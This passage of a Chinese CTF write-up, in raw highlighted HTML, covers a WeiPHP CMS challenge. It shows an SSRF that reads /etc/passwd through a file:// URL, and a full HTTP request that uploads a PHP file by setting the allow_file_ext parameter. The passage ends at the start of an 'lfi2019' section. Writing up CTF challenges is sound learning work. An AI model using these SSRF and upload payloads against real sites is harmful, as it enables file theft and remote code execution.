</span></span><span class=line><span class=cl>    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_POST</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_SSL_VERIFYPEER</span><span class=p>,</span> <span class=k>false</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_SSL_VERIFYHOST</span><span class=p>,</span> <span class=k>false</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 设置header
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nv>$type</span> <span class=o>==</span> <span class=s1>&#39;file&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$header</span><span class=p>[]</span> <span class=o>=</span> <span class=s2>&#34;content-type: multipart/form-data; charset=UTF-8&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_HTTPHEADER</span><span class=p>,</span> <span class=nv>$header</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nv>$type</span> <span class=o>==</span> <span class=s1>&#39;xml&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_HEADER</span><span class=p>,</span> <span class=k>false</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nv>$has_json</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$header</span><span class=p>[]</span> <span class=o>=</span> <span class=s2>&#34;content-type: application/json; charset=UTF-8&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_HTTPHEADER</span><span class=p>,</span> <span class=nv>$header</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// curl_setopt($ch, CURLOPT_USERAGENT, &#39;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)&#39;);
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_FOLLOWLOCATION</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_AUTOREFERER</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// dump($param);
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_POSTFIELDS</span><span class=p>,</span> <span class=nv>$param</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 要求结果为字符串且输出到屏幕上
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_RETURNTRANSFER</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 使用证书：cert 与 key 分别属于两个.pem文件
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$useCert</span><span class=p>[</span><span class=s1>&#39;certPath&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$useCert</span><span class=p>[</span><span class=s1>&#39;keyPath&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_SSLCERTTYPE</span><span class=p>,</span> <span class=s1>&#39;PEM&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_SSLCERT</span><span class=p>,</span> <span class=nv>$useCert</span><span class=p>[</span><span class=s1>&#39;certPath&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_SSLKEYTYPE</span><span class=p>,</span> <span class=s1>&#39;PEM&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_SSLKEY</span><span class=p>,</span> <span class=nv>$useCert</span><span class=p>[</span><span class=s1>&#39;keyPath&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$res</span> <span class=o>=</span> <span class=nx>curl_exec</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$type</span> <span class=o>!=</span> <span class=s1>&#39;file&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>add_debug_log</span><span class=p>(</span><span class=nv>$res</span><span class=p>,</span> <span class=s1>&#39;post_data&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// echo $res;die;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$flat</span> <span class=o>=</span> <span class=nx>curl_errno</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$msg</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$flat</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$msg</span> <span class=o>=</span> <span class=nx>curl_error</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// add_request_log($url, $param, $res, $flat, $msg);
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nv>$flat</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;curl_erron&#39;</span> <span class=o>=&gt;</span> <span class=nv>$flat</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;curl_error&#39;</span> <span class=o>=&gt;</span> <span class=nv>$msg</span>
</span></span><span class=line><span class=cl>        <span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$return_array</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$res</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$res</span> <span class=o>=</span> <span class=nv>$type</span> <span class=o>==</span> <span class=s1>&#39;json&#39;</span> <span class=o>?</span> <span class=nx>json_decode</span><span class=p>(</span><span class=nv>$res</span><span class=p>,</span> <span class=k>true</span><span class=p>)</span> <span class=o>:</span> <span class=nx>FromXml</span><span class=p>(</span><span class=nv>$res</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$res</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到 common.php 中的没有什么过滤，所以我们只需要找引用 Base.php 当中的<code>post_data</code>函数的地方就行了。我们随便登录一下就可以发现其路由规则了，比如登录路由是<code>index.php/home/user/login</code>，对应的是<code>application/home/controller/User.php</code>当中的<code>login()</code>方法，而 Base.php 跟其他 controller 有以下继承关系：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>home/controller/User.php -&gt; home/controller/Home.php -&gt; common/controller/WebBase.php -&gt; common/controller/Base.php
</span></span></code></pre></td></tr></table></div></div><p>所以<code>post_data</code>为 public 方法也可以直接调用，所以根据<code>post_data</code>方法的参数，我们需要传入几个参数，<code>url</code>为 SSRF 的点，<code>param</code>随笔即可。</p><p>这里由于 cms 开启了 debug ，这里要把<code>type</code>参数设为<code>file</code>，让<code>post_data</code>函数在调用<code>FromXml</code>函数的时候，由于我们传入诸如<code>url=file:///etc/passwd</code>的参数，会导致<code>simple_xml_load_string</code>出错</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=sd>/**
</span></span></span><span class=line><span class=cl><span class=sd> * 将xml转为array
</span></span></span><span class=line><span class=cl><span class=sd> */</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>FromXml</span><span class=p>(</span><span class=nv>$xml</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$xml</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>exception</span><span class=p>(</span><span class=s2>&#34;xml数据异常！&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>file_log</span><span class=p>(</span><span class=nv>$xml</span><span class=p>,</span> <span class=s1>&#39;FromXml&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 解决部分json数据误入的问题
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$arr</span> <span class=o>=</span> <span class=nx>json_decode</span><span class=p>(</span><span class=nv>$xml</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>is_array</span><span class=p>(</span><span class=nv>$arr</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$arr</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$arr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 将XML转为array
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$arr</span> <span class=o>=</span> <span class=nx>json_decode</span><span class=p>(</span><span class=nx>json_encode</span><span class=p>(</span><span class=nx>simplexml_load_string</span><span class=p>(</span><span class=nv>$xml</span><span class=p>,</span> <span class=s1>&#39;SimpleXMLElement&#39;</span><span class=p>,</span> <span class=nx>LIBXML_NOCDATA</span><span class=p>)),</span> <span class=k>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$arr</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://blogpic.zdy.one/img/20191109024547.png loading=lazy></p><p>可以看到在图中已经拿到了文件内容回显，所以当时我们就用这个 SSRF 拿到了 flag</p><p><img src=https://blogpic.zdy.one/img/20191109020248.png loading=lazy></p><h3 id=upload>upload</h3><p>在<code>application/home/controller/File.php</code>我们可以看到有这么一个方法</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=cm>/* 文件上传 到根目录 */</span>
</span></span><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>upload_root</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nv>$return</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;status&#39;</span> <span class=o>=&gt;</span> <span class=mi>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;info&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;上传成功&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;data&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>  <span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=cm>/* 调用文件上传组件上传文件 */</span>
</span></span><span class=line><span class=cl>  <span class=nv>$File</span> <span class=o>=</span> <span class=nx>D</span><span class=p>(</span><span class=s1>&#39;home/File&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nv>$file_driver</span> <span class=o>=</span> <span class=nx>strtolower</span><span class=p>(</span><span class=nx>config</span><span class=p>(</span><span class=s1>&#39;picture_upload_driver&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=nv>$setting</span> <span class=o>=</span> <span class=k>array</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;rootPath&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;./&#39;</span> <span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nv>$info</span> <span class=o>=</span> <span class=nv>$File</span><span class=o>-&gt;</span><span class=na>upload</span><span class=p>(</span><span class=nv>$setting</span><span class=p>,</span> <span class=nx>config</span><span class=p>(</span><span class=s1>&#39;picture_upload_driver&#39;</span><span class=p>),</span> <span class=nx>config</span><span class=p>(</span><span class=s2>&#34;upload_</span><span class=si>{</span><span class=nv>$file_driver</span><span class=si>}</span><span class=s2>_config&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=c1>//     	$info = $File-&gt;upload(config(&#39;download_upload&#39;), config(&#39;picture_upload_driver&#39;), config(&#34;upload_{$file_driver}_config&#34;));
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=cm>/* 记录附件信息 */</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nv>$info</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$return</span><span class=p>[</span><span class=s1>&#39;status&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$return</span> <span class=o>=</span> <span class=nx>array_merge</span><span class=p>(</span><span class=nv>$info</span><span class=p>[</span><span class=s1>&#39;download&#39;</span><span class=p>],</span> <span class=nv>$return</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$return</span><span class=p>[</span><span class=s1>&#39;status&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$return</span><span class=p>[</span><span class=s1>&#39;info&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$File</span><span class=o>-&gt;</span><span class=na>getError</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=cm>/* 返回JSON数据 */</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$return</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>其中是调用了<code>application/home/model/File.php</code>中的一个<code>upload</code>函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>upload</span><span class=p>(</span><span class=nv>$setting</span> <span class=o>=</span> <span class=p>[],</span> <span class=nv>$driver</span> <span class=o>=</span> <span class=s1>&#39;Local&#39;</span><span class=p>,</span> <span class=nv>$config</span> <span class=o>=</span> <span class=k>null</span><span class=p>,</span> <span class=nv>$isTest</span> <span class=o>=</span> <span class=k>false</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=o>...</span>
</span></span><span class=line><span class=cl>  <span class=nv>$info</span> <span class=o>=</span> <span class=nx>upload_files</span><span class=p>(</span><span class=nv>$setting</span><span class=p>,</span> <span class=nv>$driver</span><span class=p>,</span> <span class=nv>$config</span><span class=p>,</span> <span class=s1>&#39;download&#39;</span><span class=p>,</span> <span class=nv>$isTest</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=o>...</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这个函数又调用了<code>application/common.php</code>当中的<code>upload_files</code>函数，然后我们可以发现又这么一段神奇的代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$type</span> <span class=o>==</span> <span class=s1>&#39;picture&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>//图片扩展名验证 ，图片大小不超过20M
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nv>$checkRule</span><span class=p>[</span><span class=s1>&#39;ext&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;gif,jpg,jpeg,png,bmp&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nv>$checkRule</span><span class=p>[</span><span class=s1>&#39;size&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>20971520</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nv>$allowExt</span> <span class=o>=</span> <span class=nx>input</span><span class=p>(</span><span class=s1>&#39;allow_file_ext&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nv>$allowExt</span> <span class=o>!=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$checkRule</span><span class=p>[</span><span class=s1>&#39;ext&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$allowExt</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nv>$allowSize</span> <span class=o>=</span> <span class=nx>input</span><span class=p>(</span><span class=s1>&#39;allow_file_maxsize&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nv>$allowSize</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$checkRule</span><span class=p>[</span><span class=s1>&#39;size&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$allowSize</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里<code>input('allow_file_ext', '');</code>表示我们可以设置允许上传的类型&mldr;然后我们随便上传一个试试</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/weiphp/public/index.php/home/file/upload_root</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>zedd.vv</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=---------------------------6593480186465200061941970669</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>480</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://zedd.vv</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://zedd.vv/upload.html</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>PHPSESSID=0cfb281c78e25924ebb7c8abe9084590</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-----------------------------6593480186465200061941970669
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;name&#34;; filename=&#34;1.phtml&#34;
</span></span><span class=line><span class=cl>Content-Type: text/php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>phpinfo();?&gt;
</span></span><span class=line><span class=cl>-----------------------------6593480186465200061941970669
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;allow_file_ext&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>phtml
</span></span><span class=line><span class=cl>-----------------------------6593480186465200061941970669
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;allow_file_maxsize&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>1024
</span></span><span class=line><span class=cl>-----------------------------6593480186465200061941970669--
</span></span></code></pre></td></tr></table></div></div><p>虽然报错了但是我们依然上传成功了，直接访问那个路径即可。</p><p><img src=https://blogpic.zdy.one/img/20191109134834.png loading=lazy></p><p><img src=https://blogpic.zdy.one/img/20191109135000.png loading=lazy></p><h2 id=lfi2019>lfi2019</h2><p>在 header 头有一个提示可以拿到源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>X-Hint: /index.php?show-me-the-hint
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
